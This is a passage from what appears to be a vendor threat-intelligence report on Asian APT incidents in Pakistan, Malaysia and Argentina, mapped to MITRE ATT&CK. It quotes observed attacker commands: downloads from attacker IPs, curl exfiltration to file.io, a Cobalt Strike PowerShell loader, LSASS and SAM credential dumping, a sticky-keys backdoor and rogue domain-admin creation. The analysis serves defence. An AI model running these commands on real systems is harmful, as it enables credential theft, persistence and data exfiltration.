С:\\Windows\\help\\help\\dll7.dll\n\n\n-----\n\nFigure 12 Execution graph. TIP interface\n\nThe tool named ssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D) is a built variant of the publicly\navailable mimikat_ssp tool[3], which is used to compromise and steal account credentials and secrets from lsass.\nexe. It is also used by various Asian APT groups.\n\n3\n\nmimikat_ssp\n\n[Learn more](https://github.com/jas502n/mimikat_ssp)\n\n\n-----\n\nFigure 13 Building mimikat_ssp\n\nThe second tool, DuplicateDump.exe, is also used to compromise and steal account credentials and secrets\nfrom lsass.exe. A special feature of this tool is the capability to duplicate the handle of the lsass.exe process.\nThis way, the tool obtains a ready-to-use handle for the lsass.exe process without calling OpenProcess,\nthereby allowing it to bypass conventional detection of LSASS dump based on the Sysmon event[4]\"Process\nAccess\" with an event ID 10. Just like in the first case, we detected the use of this tool by Asian APT groups.\n\n4\n\nDuplicateDump\n\n\n[Learn more](https://github.com/Hagrid29/DuplicateDump)\n\n\n-----\n\nFigure 14 Tool description\n\n**Unsecured Credentials: Group Policy Preferences T1552.006:**\n\nIn addition to the lsass.exe process dump, the attacker attempted to find passwords in group policy files by\nusing the findstr tool and the keyword «cpassword»:\n\n\ncmd.exe /C findstr /s /i \"cpassword\" \\\\<dc_hostname>\\sysvol\\*.xml\"\n\n\nWe detected that the threat actor used bitsadmin and PowerShell to download the file named 1.txt to the\ncompromised system after stealing account credentials. Unfortunately, we were not able to obtain this file\nduring our incident investigation. The purpose of this download remains unclear. Nonetheless, any use of tools\nto download files from suspicious external IP addresses within a domain is definitely a suspicious event.\n\n**BITS Jobs T1197 + Ingress Tool Transfer T1105:**\n\n\ncmd.exe /c bitsadmin /transfer n http://8.210.141[.]104:8099/1.txt $public\\Downloads\\1.txt\n\n\n-----\n\n**PowerShell T1059.001 + Ingress Tool Transfer T1105:**\n\nсmd.exe /c PowerShell iwr -Uri http://8.210.141[.]104:8099/1.txt -OutFile c:\\1.txt -UseBasicParsing\n\nRelevant information is gathered by using archives that are stored in the same directory as before: \"$windir\\\nHelp\\Help\".\n\n**Archive Collected Data: Archive via Utility:**\n\n$windir\\Help\\Help\\7z.exe a $windir\\Help\\Help\\tg.7z $windir\\Help\\Help\\1.rar\n\nThe archives are exfiltrated to a legitimate cloud storage using the curl utility.\n\n**Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002:**\n\ncurl.exe -F \"file=@$windir\\help\\help\\1.rar\" --ssl-no-revoke https[:]//file.io\n\n\n-----\n\n###### Summary\n\nThe attackers employ the favored technique of Asian APT groups for persistance in the infrastructure —\n**Hijack Execution Flow: DLL Side-Loading T1574.002. The attack also employs tools that are predominately**\npopular on Asian forums for obtaining user credentials. The most likely goals of the attackers are\ncyberespionage and data exfiltration. Data is collected into individual archives and exfiltrated using legitimate\nservices, such as popular cloud storage services.\n\nDownload techniques in JSON format for MITRE Navigator:\n\n\n[Learn more](https://box.kaspersky.com/f/e5056a126ca14c829267/?dl=1)\n\n\nFigure 15 Threat Landscape page interface in TIP\n\n\n-----\n\n###### Incidents involving Asian APT groups in various regions of the planet\n\n### Incident 3.  Pakistan\n\n\n-----\n\n##### Incident 3. Pakistan\n\n###### Victim summary\n\nIndustry Countries affected Threat\n\n###### Telecommunications Pakistan Shadowpad, PlugX,\n China Chopper, Stowaway RAT\n\n Incident description\n\nIn mid-Autumn of 2021, Kaspersky experts detected a new ShadowPad malware campaign targeting one of the\nnational telecom companies of Pakistan. During a retrospective analysis of suspicious activity in the telecom\nnetwork, experts were able to detect an active backdoor of the ShadowPad family on computers of ICS\nengineers and on automation systems. Based on the collected data, we can presume that the attack began no\nlater than the winter of 2021, and the attackers were active on the network for at least 11 months.\n\n###### Detailed description\n\nIt is assumed that the initial infection occurred due to an exploit of a vulnerability in MS Exchange: CVE-2021-\n26855 — Exploit Public-Facing Application T1190. After gaining access to the system, the attackers installed\nthe Cobalt Strike backdoor, which was most likely used for the initial collection of information, including\nauthentication data. It is our presumption that this data was used for lateral movement through the network.\n\nThe mail server of the victim had a Web Shell in the form of a malicious DLL used by the attackers to gain\nremote access to the server.\n\n\n-----\n\nFigure 16 Malicious DLL—Web Shell\n\nSequence of commands:\n\ncmd /c cd /d \"C:/inetpub/wwwroot/aspnet_client\"&whoami&echo [S]&cd&echo [E]\"\n\nThis was previously seen in the well-known Web Shell named \"China Chopper Webshell[5]\"\n\n5\n\nChina Chopper\n\n[Learn more](https://www.mandiant.com/resources/blog/breaking-down-the-china-chopper-web-shell-part-ii)\n\n\n-----\n\nThe backdoor was installed in the system as a Windows service (Windows Service T1543.003). The Cobalt\nStrike typically uses services with names consisting of 8 random characters:\n\n\n$hklm\\system\\controlset001\\services\\hixnjvod\n\n\n**Windows Command Shell T1059.003 + PowerShell T1059.001 + Obfuscated Files or Information T1027:**\n\nThe executable file used for the service was cmd.exe with parameters for running a script in PowerShell. This\nscript contained Cobalt Strike in the form of binary (shell) code with a size of ~100 bytes, was executed in the\ncontext of the PowerShell process, and used the Win32 API.\n\n\nС:\\Windows\\system32\\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c\n\"if([IntPtr]::Size -eq 4){$b=$env:windir+\n\n'\\sysnative\\WindowsPowerShell\\v1.0\\PowerShell.exe'}else{$b='PowerShell.exe'};$s=NewObject System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop\n-w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object\nSystem.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.\nConvert]::FromBase64String(''H4sIAIKCBWACA7VWa2+\n\nbSBT9nEj5D6iyZFAcP5I0bSJVWsY2McR2jYlxbK+1IjDA1MMjMDgm3f73vYMhTbdp....\n\n'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';\n$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;\n$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\n\n\n**Ingress Tool Transfer T1105:**\n\nWe also observed the installation of Cobalt Strike using the LOLBin tool certutil.exe (Living off the Land\nBinary):\n\n\n$system32\\cmd.exe /c certutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe && update.\nexe && certutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe delete\n\n\n-----\n\n**Communication with the C2 server**\n\nWe detected a version of Cobalt Strike in which the malware does not connect to a C&C server. Instead, it\nopens a network port and waits for a connection.\n\nTo work properly, this version of Cobalt Strike must receive binary shell code that will be executed\nsynchronously after it is received and copied to dynamic memory. Then Cobalt Strike uses the JMP command\nto divert execution to the received shell code. To connect to Cobalt Strike, the victim must have an open public\nIP address, or the attacker must be in the same subnet as the victim. For this connection, the attacker often\nuses \"pivoting\" to route traffic that is not usually routed in normal conditions.\n\n**Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003**\n\nOn one of the infected hosts, we detected execution of the malicious file GoogleUpdate.exe (MD5:\nBF78566E8FE8B51D0AB7190917846C10). Its parent process was wmiprvse.exe, which indicates that an WMI\nevent subscription was created by the attackers for persistence purposes.\n\n\ninstance of __EventFilter {\nEventNamespace = \"root\\\\cimv2\";\nName = \"Chrome Update\";\nQuery = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance\nISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=240 AND\nTargetInstance.SystemUpTime < 325\";\nQueryLanguage = \"WQL\"; };\n\n\ninstance of CommandLineEventConsumer {\nExecutablePath = \"C:\\\\Windows\\\\System32\\\\GoogleUpdate.exe\";\nName = \"GoogleUpdater\";\n};\n\n\n**PowerShell T1059.001 + BITS Jobs T1197 + Obfuscated Files or Information T1027**\n\nWhen executed, GoogleUpdate.exe downloads the second-stage \"Stowaway\" implant by running the following:\n\n\nPowerShell \"Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt Destination C:\\\\Users\\\\public\\\\node.txt -transfertype download\"\nPowerShell if($InputString = Get-Content 'C:\\\\users\\\\public\\\\node.txt'){\n\n[System.IO.File]::WriteAllBytes('C:\\\\users\\\\public\\\\node.exe',\n\n[System.Convert]::FromBase64String($InputString))}\n\n\n-----\n\nThe sample uses BITS Jobs to access the C2 and download the text file node.txt, which was converted into an\nexecutable file named node.exe (MD5: 344edbebb97ed8dfe79805a721b4048b).\n\nFigure 17 Kaspersky Threat Attribution Engine Report\n\n**Scheduled Task/Job: Scheduled Task T1053.005**\n\nThen the attackers move node.exe to C:\\Windows\\Registration\\crml.exe, change the file attributes by making it\na system file, and create a scheduled job:\n\nattrib +s crml.exe\nschtasks /Create /Tn \\Microsoft\\Windows\\Registration\\CRMLog /sc daily /st 11:50 /tr\n\"С:\\Windows\\Registration\\crml.exe\" /ru system /f\nschtasks /run /Tn \\Microsoft\\Windows\\Registration\\CRMLog\n\n\n-----\n\n**Hijack Execution Flow: DLL Side-Loading T1574.002**\n\nGoogleupdate.exe also started the ShadowPad backdoor and downloaded the following two executable files\nwith the TXT extension from Google Drive:\n\n- Legitimate executable file named AppLaunch.txt that is part of the Microsoft .NET platform\n\n- ShadowPad DLL named \"mscoree.txt\"\n\nIt decodes them from base64 and changes the extensions:\n\n\nc:\\programdata\\microsoft\\windows\\caches\\dnscache.exe (applaunch.exe)\nMD5: 41F3BF4FA8FA92BF111FD8A47A0D470F\n\nc:\\programdata\\microsoft\\windows\\caches\\mscoree.dll\nMD5: 8d46b2d39a8de09a5dc9f226b360b0ef\n\n\nAppLaunch.exe was started as a service (parent process C:\\Windows\\System32\\services.exe).\n\n###### ShadowPad DLL (mscoree.dll) is loaded into the legitimate process\nFigure 18\n###### AppLaunch.exe\n\n\n-----\n\nFigure 19 Kaspersky Threat Attribution Engine\n\nOn the compromised server where the Web Shell was installed, we also detected a download of the\nShadowPad backdoor via BITS Jobs — BITS Jobs T1197.\n\n$system32\\cmd.exe /c bitsadmin /transfer n\nhttps://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\\aro.dat > C:\\inetpub\\wwwroot\\\naspnet_client\\1.txt\n\nDuring our analysis, we were also able to detect different variants of DLL Sideloading used to download and\nthen run this backdoor. For example, we observed the legitimate application OLEVIEW.EXE being used to\nimplement DLL Sideloading T1574.002:\n\nOLEVIEW.EXE\nMD5: FDD423B3855A9AE5E83FFB1CC80D2215 (x86)\nMD5: 8FDF8E4ECFF114C1E6C9827C53742A1C (x64)\n\niviewers.dll\nMD5: 13759AE233572847A2F75D36AA51FABC\n\n\n-----\n\niviewers.dll connects to the C2 server and downloads the ShadowPad backdoor from it: iviewers.dll.dat.\n\nThen OLEVIEW.EXE creates a new svchost.exe process to avoid detection and injects the malicious payload of\nShadowPad into this process (Process Hollowing T1055.012).\n\n**Valid Accounts T1078:**\n\nWe detected signs indicating that the attackers were spreading to other computers on the network two\nmonths after the initial infection. This may mean that the attackers were not in a hurry, and were trying to avoid\nearly detection. It is assumed that the attackers used valid account credentials for authentication, or used\naccount credentials that were previously gathered from a compromised host for lateral movement through the\nnetwork.\n\nUsing the backdoor, the attackers were able to execute commands remotely and download new tools.\n\nAs a result, we see that cmd.exe was run from the ShadowPad-infected svchost.exe and a series of commands\nfor reconnaissance:\n\n###### MITRE ATT&CK  Commands matrix technique\n\nSystem Owner/User Discovery T1033 quser.exe quser\n\ncmd.exe /C arp -a >\nSystem Network Configuration Discovery T1016\n$temp\\gGjrIFGa.tmp 2>&1\n\nnetstat.exe -ano\nSystem Network Connections Discovery T1049\nnetstat.exe user\n\nping.exe 8.8.8.8\nRemote System Discovery T1018 ping.exe google.com\nping.exe 167.179.64[.]62\n\n**Data from Local System T1005**\n\nAfter executing discovery commands, the attacker copied the contents of the desktop and downloads folder,\nwhich may potentially contain confidential information, into the directory C:\\$recycle.bin\\temp:\n\n\ncmd.exe /C xcopy /s $user\\desktop c:\\$recycle\\bin\\temp\\<redacted>\ncmd.exe /C xcopy /s $user\\downloads c:\\$recycle\\bin\\temp\\<redacted>\n\n\n-----\n\nArchiving desktop contents — Archive Collected Data: Archive via Utility T1560.001:\n\n\ncmd.exe /C $programfiles\\winrar\\rar.exe a -r -hp1234 C:$recycle.bin\\10020111desk.rar\n$user\\desktop\\*.txt\n$user\\desktop\\*.xls*\n$user\\desktop\\*.pdf\n$user\\desktop\\*.doc*\n$user\\desktop\\*.jpg >\n$temp\\lwefqERM.tmp 2>&1\n\n\n**OS Credential Dumping: Security Account Manager T1003.002**\n\nThen we detected that a suspicious file was run from the recycle bin (c:\\$recycle.bin\\temp). This file was named\nm1.log (Trojan-PSW.Win32.Mimikatz.eni)\n\nWe also detected a dump of the SAM registry hive using the system utility reg.exe:\n\n\nС:\\Windows\\System32\\reg.exe save hklm\\sam sam.hive\n\n\nThe dump was saved to the recycle bin С:\\$recycle.bin\\temp, then the temp folder in the recycle bin was rearchived.\n\nAfter some time, the attackers used the procdump64.exe tool, which was renamed to errorreport.exe:\n\n\nerrorreport.exe -ma lsass.exe l.dmp\n\n\nLSASS dump was performed several times over the course of several days using Mimikatz and Procdump.\n\n**Remote Services: SMB/Windows Admin Shares T1021.002**\n\nDuring the next stage, the BAT file $windir\\help\\sys.bat was executed to mount network drives using the\ncompromised credentials of a user:\n\n\nnet use \\\\<remote ip> \"<password>\" /u:<domain>\\<username>\n\n\n-----\n\nWe noticed POST requests from the svchost.exe process (ShadowPad) to the following resources (probably to\nexfiltrate the collected data):\n\norder.cargobussiness[.]site/\ndocuments.kankuedu[.]org/\nlive.musicweb[.]xyz\nobo.videocenter[.]org\ntech.obj[.]services\nhouwags.defineyourid[.]site\nnoub.crabdance[.]com\ngrandfoodtony[.]com\n\nLater, similar activity was detected on other computers in the network. However, the attacker used a BAT\nfile instead of manually executing commands. Notably, the choice command was used instead of the ping\ncommand in the sleep role:\n\ncmd /c mkdir С:\\Windows\\temp\\debugsms\ncmd /c reg save hklm\\sam С:\\Windows\\temp\\debugsms\\sam\ncmd /c reg save hklm\\system С:\\Windows\\temp\\debugsms\\system\ncmd /c reg save hklm\\security С:\\Windows\\temp\\debugsms\\security\ncmd /c choice /t 1 /d y /n >nul\ncmd /c ipconfig /all > С:\\Windows\\temp\\debugsms\\ip.txt\ncmd /c arp -a > С:\\Windows\\temp\\debugsms\\arp.txt\ncmd /c dir /b /s С:\\Windows\\temp\\debugsms\\ > С:\\Windows\\temp\\siineidvsms.log\ncmd /c makecab /f С:\\Windows\\temp\\siineidvsms.log /d compressiontype=lzx /d\ncompressionmemory=21 /d maxdisksize=10240000000 /d diskdirectorytemplate=”C:\\Program Files\\\nMicrosoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth” /d cabinetnametemplate=iisstop.png\ncmd /c choice /t 1 /d y /n>nul\ncmd /c start С:\\Windows\\temp\\TMP23876.bat\ncmd /c rmdir /s /q С:\\Windows\\temp\\debugsms\n\n**Collection and Exfiltration**\n\nOn another infected host, the attackers created the following job in the form of a PowerShell command in the\ntask scheduler for data collection and exfiltration\n\ncmd /c С:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.EXE -c \"$ctnt=Get-Content\n$temp\\Err_36d96944_6318.log;PowerShell -enc $ctnt;\n\n\n-----\n\nThe file $temp\\Err_36d96944_6318.log contains a base64 string comprising the following script:\n\nFigure 20 Script contents\n\nThis complex type of startup is a technique known as Obfuscated Files or Information T1027.\n\n**Automated Collection T1119 + Archive Collected Data: Archive via Utility T1560.001**\n\nThis script uses a recursive search to gather files with the extensions *.txt, *.rtf, *.pdf, *.ppt, *.pptx, *.doc (the\nattacker's script has the typo '*,doc'), *.docx, *.csv, *xlsx, *.xls, *.vsd, *.pst, *.eml, *.jpg, *.jpeg, and *.png, then\ncopies them to a separate directory, archives them, and runs an exfiltration script that is also encoded into a\nbase64 string (line 21).\n\n\n-----\n\n**Automated Exfiltration T1020 + Exfiltration Over C2 Channel T1041**\n\nThe exfiltration script is presented below:\n\nFigure 21 Script contents\n\n###### Summary\n\nThis incident describes another campaign of the ShadowPad malware aimed at national infrastructure.\nShadowPad samples were also detected in Afghanistan and in a transportation company in Malaysia. This may\nbe an indication of far-reaching geographic interests of the particular APT group. It is likely that the main goal of\nthe attackers is to gather critical or confidential data through cyberespionage. Notably, the campaign primarily\ninvolved use of the technique known as Hijack Execution Flow: DLL Side-Loading T1574.002, which is\ntypical of Asian APT groups.\n\nDownload techniques in JSON format for MITRE Navigator:\n\n\n[Learn more](https://box.kaspersky.com/f/09bf09c599e243198b36/?dl=1)\n\n\n-----\n\nFigure 22 Threat Landscape page interface in TIP\n\n\n-----\n\n###### Incidents involving Asian APT groups in various regions of the planet\n\n### Incident 4.  Malaysia\n\n\n-----\n\n##### Incident 4. Malaysia\n\n###### Victim summary\n\nIndustry\n\n\nCountries affected\n\n\nThreat\n\n###### ToddyCat\n\n\n###### Government\n\n Incident description\n\n\n###### Malaysia\n\n\nIn February of 2023, our SOC team was alerted about a potential security breach observed in the telemetry of\none of our customers. Further investigation revealed that the well-known APT group known as ToddyCat was\nprobably responsible for the attack. Details of the incident, including the event history, and the TTPs used by\nthe group are described below.\n\n###### Detailed description\n\nDuring SOC monitoring, our analysts detected malicious activity pointing to ToddyCat. When investigating\nthe alert, we focused on a suspicious DLL that was run as a Windows service (Create or Modify System\n**Process: Windows Service T1543.003). The ToddyCat alert was triggered by their typical pattern of**\nimplementing the LZSS algorithm in the memory of a process that was detected by Kaspersky Endpoint\nSecurity (KES):\n\n\nCommandLine: С:\\Windows\\system32\\svchost.exe -k fontcsvc\n\n\nThe DLL file of the Windows service was found in the following registry key:\n\n\nRegistry key: HKLM\\System\\ControlSet001\\Services\\FontCacheSvc\\Parameters\\ServiceDll\nRegistry value: C:\\Program Files\\Common Files\\System\\apibridge.dll\nMD5: BB08CAE5C2C741BC040C9EC6E046BCAC\n\n\n-----\n\nWe also detected a suspicious library, but unfortunately, we were not able to obtain the file:\n\nDLL: С:\\Windows\\system32\\up.dll\nMD5: 5448F7DB84E87FEDD362F4A79C9BC302\nRegistry hive: HKLM\\SYSTEM\\ControlSet001\\Services\\ctt\nCommandline: cmd /c start /b rundll32.exe С:\\Windows\\system32\\up.dll,Start\n\nThe FontCacheSvc service was started by the services.exe process while an RPC connection from a remote\nhost was established at the same time. This indicates that the service was created from the remote host using\nthe sc create command. Unfortunately, the remote host was not connected to our monitoring system and we\nwere unable to get event log files from it.\n\n**Application Layer Protocol: Web Protocols T1071.001**\n\nThe service process mentioned above connected to 154.202.56[.]211:443 and made a POST request:\nhxxps://154.202.56[.]211/collector/3.0/. This URL matches the URL path structure used by ToddyCat.\n\n**Ingress Tool Transfer T1105**\n\nSeveral scripts and executable files were downloaded from this C2 server to the target host.\n\nc:\\intel\\mvl.ps1\nc:\\intel\\1.ps1\nc:\\intel\\7z64.exe\nc:\\intel\\db_org.exe (MD5: BEBBEBA37667453003D2372103C45BBF)\n\nInterestingly, PowerShell scripts were downloaded several times but with different MD5 hashes. The\ndownloaded scripts were accompanied by the tools necessary for them to work, such as the file archiving tool\nWinRAR that was renamed to 7z64.exe.\n\nIn addition, the service started a command shell in which we observed the following reconnaissance\ncommands and lateral movement through the network:\n\ntasklist /v\narp -a\nnet use\nping <host> -n <count>\nnet user <username> /dom\nnet group “domain admins” /dom\n\n\n-----\n\n**Remote Services: SMB/Windows Admin Shares T1021.002**\n\nAfter conducting their reconnaissance, the operator used the net use command to attempt to connect to\nremote hosts with a compromised user account:\n\n\nnet use \\\\<hostname>\\c$ <password> /user:<domain>\\<username>\n\n\nWhen successfully connected, the operator created a scheduled task on the remote machine.\n\n**Scheduled Task/Job: Scheduled Task T1053.005**\n\nOn each remote host that the attacker was able to connect to, a one-time scheduled job aptly named \"one\"\nwas created to run the PowerShell script that was previously downloaded from the C2 server:\n\n\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /create /ru system /sc\nDAILY /tr \"cmd /c start /b PowerShell.exe -exec bypass -c 'C:\\programdata\\intel\\mvl.ps1 20'\" /f\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /i /run\n\n\n**System Services: Service Execution T1569.002**\n\nOn one of the remote hosts, the attacker failed to create a scheduled task and then attempted to create a\nservice:\n\n\nsc \\\\<hostname> create ctt binpath= \"cmd /c start /b PowerShell.exe -exec bypass -c\n'C:\\programdata\\intel\\mvl.ps1 30'\"\nsc \\\\<hostname> start ctt\nsc \\\\<hostname> delete ctt\n\n\nWe also observed the use of AtExec and PsExec to move malicious files and run them on remote hosts.\n\n**Automated Collection T1119**\n\nThe PowerShell script that was run in the scheduled task searches for documents in user folders and saves the\nfound files in a new folder with the hostname in a temporary directory.\n\n\n-----\n\n**Indicator Removal: Clear Persistence T1070.009**\n\nAfter running the PowerShell script, the job was immediately deleted:\n\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /f /delete\n\nThis is one of the usage cases of the Indicator Removal technique: Clear Persistence T1070.009. The\nattackers delete artifacts of their persistence to conceal signs of their activity. Another potential reason for\ndeleting the task after its execution could be to prevent errors that may arise if the malware is redeployed.\n\n**Archive Collected Data: Archive via Utility T1560.001**\n\nAfter running the PowerShell script, the operator copied the created archive back to the machine from which\nthey were operating.\n\nxcopy \\\\<hostname>\\c$\\programdata\\intel\\<hostname> c:\\intel /s /h /f\n7z64 a <hostname>.z hostname -v200m\n\nFor example, data archiving from another remote machine was performed via a one-time task:\n\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /create /ru system /sc\nDAILY /tr \"C:\\programdata\\intel\\7z64.exe a c:\\programdata\\intel\\<hostname_folder>.z c:\\programdata\\\nintel\\<hostname_folder> -v200m\" /f\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /i /run\nschtasks /s <remote_host> /tn one /u <domain>\\<username> /p <password> /f /delete\n\n**Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002**\n\nWhen data archives from multiple machines were saved on the initial machine, the operator ran a file named\ndb_org.exe:\n\nCommandLine: db_org.exe <redacted>\n\n\n-----\n\nThe argument sent to the program is a file name in the form of an encoded string. This executable file is\nintended for sending data to the Dropbox cloud service.\n\nWe saw above that persistence was facilitated by creating a new FontCacheSvc service using svchost.exe.\nDuring our investigation, we also encountered other techniques.\n\n**Hijack Execution Flow: DLL Side-Loading T1574.002**\n\nThe following files were moved from the operator's machine to another one:\n\n- vlc.exe, a popular legitimate application known as VLC Media Player, which is vulnerable to DLL Hijacking\n\n- libvlc.dll, a malicious library (MD5: CBE5AEB8D809C4E09C7C2B7705C35F95);\n\n- playlist.dat, a RAT config.\n\nTo run the RAT via DLL Sideloading, the attackers created a service remotely using sc.exe:\n\n\nsc \\\\<hostname> create VLCMediaSvc binpath= “\"C:\\Program Files\\Common Files\\VLCMedia\\vlc.exe\"\nservice”\n\n\nAfter starting the service, the vlc.exe process loads a malicious library that it turn decrypts the RAT\nconfiguration file, starts the legitimate process c:\\windows\\system32\\wusa.exe in the suspended state, then\ninjects the RAT into the process (Process Hollowing T1055.012).\n\nFigure 24 Attack scenario\n\nDecrypting beacon config\n\nPlaylist.dat Cmd.exe\n\nCreating process in\nsuspended mode &\ninject beacon\n\n###### Libvlc.dll Wusa.exe\n\nCreated\nLaunching Loading Connection to\nWindows Service legitimate VLC.exe malicious DLL C2 server\n\n|Col1|Cmd.exe|\n|---|---|\n|Wusa.exe||\n\n|Col1|Creating process in suspended mode & inject beacon Libvlc.dll|\n|---|---|\n|Loading VLC.exe malicious DLL||\n\n\n-----\n\nWe already examined how the ToddyCat implant works earlier in this document. In this case, the request to\nthe C2 server is sent to hxxps://45.124.115[.]83/collector/3.0/ and the necessary files are downloaded from it.\nThese downloaded files include a PowerShell script for gathering user documents and running a command\nshell that is used by the operator for reconnaissance and lateral movement through the network.\n\nFigure 25 Command center location\n\n**Persistence: Account Creation**\n\nIn addition to creating various services and tasks in the Task Scheduler, the APT group known as ToddyCat\nused an additional tool that created an administrative account (Create Account: Domain Account\n**T1136.002).**\n\nA scheduled job was created to run this tool. The commands, username, and password are hardcoded in this\ntool.\n\n\nNew Task: GoogleUpdate: MD5: 0x80499E88A7054F83674463F029D58657\nSvchost.exe (svchost.exe -k netsvcs -p -s Schedule)\nCmd.exe\nnet user norshasa /del /do\nnet user norshasa P@ssw0rd123... /add /do\nnet user norshasa /active:yes\nnet group \"Domain Admins\" norshasa /add /do\nnet localgroup \"Remote Desktop Users\" norshasa /add /do\n\n\n-----\n\n**Lateral Movement: PsExec и Atexec**\n\nEarlier, we saw the SMB protocol being used when creating a Windows service or task on a remote host. We\nalso saw the use of PsExec and AtExec.\n\nUsing a RAT, the operator downloaded the PsExec tool: Ps2.exe\n\nParent_image_path: “С:\\Windows\\system32\\cmd.exe”\nCommand_line: “Ps2.exe -accepteula -h \\\\<remote_host> -u <user> -p <password> cmd”\n\nAs expected, we observe the psexesvc service being created on the remote computer:\n\nParent_image_path: “С:\\Windows\\psexesvc.exe”\nImage_path: “С:\\Windows\\system32\\cmd.exe”\n\nHere are some more examples of commands that were executed on the remote host using PsExec:\n\nquser\nreg save hklm\\sam sa\nreg save hklm\\system sys\nreg save hklm\\security sec\n\nrundll32.exe С:\\Windows\\System32\\comsvcs.dll, MiniDump 880 lsass.dmp full\nrundll32.exe С:\\Windows\\System32\\111.dll, MiniDump 880 lsass.dmp full\n\nntdsutil.exe “ac i ntds” “ifm” “create full c:\\programdata\\temp” q q\n\nC:\\ProgramData\\rc.exe (Rubeus)\nklist\n\nreg add \"HKLM\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\sethc.\nexe”\" /v Debugger /t reg_sz /d \"\\windows\\system32\\cmd.exe”\n\nThe last command uses the technique known as Event Triggered Execution: Accessibility Features\n**T1546.008, specifically through the Accessibility Featur called Sticky Keys (sethc.exe) to run the cmd.exe**\ncommand shell from a lock screen.\n\n\n-----\n\nС:\\Windows\\system32\\winlogon.exe\nС:\\Windows\\system32\\cmd.exe sethc.exe 211\nreg save hklm\\sam C:\\ProgramData\\sa\n\n\nKES blocked the PowerShell scripts that were used to gather user documents, so the attackers\nwere forced to change their approach. For this reason, they wrote a batch script (MD5:\n114DECCBB815C520DD2291C946A3A7ED) in which they also used PowerShell to gather user files:\n\n\nPowerShell.exe \"dir C:\\Users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx' | where\nLastWriteTime -gt (Get-date).AddDays(-8) | copy-item -Destination C:\\Users\\public\\tmp -Force\n-ErrorAction SilentlyContinue\"\n\n\nThis was also blocked, so the attackers decided to implement this functionality in .NET through fkw.exe (MD5:\nAFEA0827779025C92CAB86F685D6429A).\n\nThe next interesting tool we found was a DLL Hijacker library that tracks the creation of new files and maintains\nrecords in an SQLite database:\n\n\nС:\\Windows\\temp\\exe\\dsncdiag.dll - (MD5 5607A0E2BB87D6BE828A5E2980116CFA,\n14FF83A500D403A5ED990ED86296CCC7)\nС:\\Windows\\temp\\exe\\acrord64.exe\n\n\nThere is another DLL Hijacker tool for data exfiltration at the path C:\\windows\\temp\\ck\\vspmsg.dll (MD5\n318C16195F62094DADCC602B547BBE66):\n\n\nCommand_line: “С:\\Windows\\temp\\ck\\securityhealthsystray64.exe -d С:\\Windows\\temp\\ --rex *.z*”\n\n\n-----\n\n###### Summary\n\nAfter carefully examining the actions of the attacker in this incident, we can assume that the group behind\nthis attack was highly motivated, was entrenched in the infrastructure for a long time, and had a store of\ncreated user accounts that the attackers could use to get back into the network. They varied their persistence\nmethods on different hosts, and modified the PowerShell scripts that they used to gather data. The samples\nused in the attack can be tentatively attributed to ToddyCat. An article about this APT group was previously\npublished on the Securelist portal[7]. Its victims are primarily government agencies and military structures\npredominately located in Asia.\n\nDownload techniques in JSON format for MITRE Navigator:\n\n[Learn more](https://box.kaspersky.com/f/131fec4d859540a69625/?dl=1)\n\nFigure 25 Threat Landscape page interface in TIP\n\n7\n\nAPT ToddyCat\n\n[Learn more](https://securelist.com/toddycat/106799/)\n\n\n-----\n\n###### Incidents involving Asian APT groups in various regions of the planet\n\n### Incident 5.  Argentina\n\n\n-----\n\n##### Incident 5. Argentina\n\n###### Victim summary\n\nIndustry\n\n\nCountries affected\n\n\nThreat\n\n###### Dark Seoul, HolyGhost\n\n\n###### Government\n\n Incident description\n\n\n###### Argentina\n\n\nIn April of 2022, we detected an incident related to a government agency of Argentina. Based on our analysis\nof the techniques, tactics, and tools employed by the attacker, we can assume that these actions were taken\nby the APT group known as Dark Seoul. A preliminary analysis indicated that the attackers used a privileged\naccount to run various files on the system and to run a malicious file known as HolyGhost Ransomware. The\ndata collected from the customer's machines allowed us to reconstruct a timeline of events and analyze this\nincident in detail. We'll examine the details below.\n\n###### Detailed description\n\n**Exploit Public-Facing Application T1190**\n\nThe attackers gained initial access by exploiting the vulnerability CVE-2021-44228 (Log4Shell) in VMware\nHorizon.\n\n**Valid Accounts: Domain Accounts T1078.002**\n\nTo execute commands on other machines in the network, they used a built-in local administrator account or\nprivileged accounts that were compromised during the attack.\n\nHere is an example log for ransomware started under a privileged account (KES blocked it from running):\n\n\nEvent : 5203\nSource : Real-Time File Protection\nCategory : (3)\nThe following information was included with the event: С:\\Windows\\btlc.exe\nHEUR: Trojan-Ransom.Win32.Generic\n\n\n-----\n\n**System Services: Service Execution T1569.002**\n\nThe attackers created Windows services with names that are similar to legitimate services (Masquerade Task\n**or Service T1036.004).**\n\n%SystemRoot%\\System32\\svchost.exe -k msupdate2\nSERVICE_CREATE\nS-1-5-18 (NT AUTHORITY\\SYSTEM)\n\nEvent : 7045\nService Name: Windows Host Management\nService File Name: cmd /K start С:\\Windows\\setup\\svchost.exe\nService Type: user mode service\nService Start Type: auto startService Account: LocalSystem\n\nEvent : 7045\nService Name: 